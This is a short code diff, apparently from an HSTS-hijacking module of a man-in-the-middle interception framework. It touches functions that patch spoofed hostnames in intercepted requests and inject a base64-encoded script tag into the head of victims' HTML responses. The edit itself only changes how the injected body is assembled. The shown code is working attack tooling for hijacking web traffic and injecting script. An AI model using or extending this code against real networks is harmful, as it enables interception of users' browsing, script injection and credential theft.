@@ -583,7 +583,6 @@ function onRequest(req, res) {
 			// Patch spoofed hostnames.
 			for (var a = 0; a < target_hosts.length; a++) {
 
-
 				// Patch spoofed hostnames in headers.
 				regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a])
 				if ( req.Headers.match(regexp_set[0]) ) {
@@ -787,7 +786,7 @@ function onResponse(req, res) {
 						payload_marker = randomString(16)
 						res_injected_buffer = res_inject_buffer.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + payload_marker + "\"></script>")
 						res_injected_buffer = res_injected_buffer.replace( payload_marker, btoa(injection) )
-						res.Body = res.Body.replace(res_inject_buffer, res_injected_buffer)
+						res.Body = res_injected_buffer + res.Body.substr(1000)
 						log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
 					}
 				}
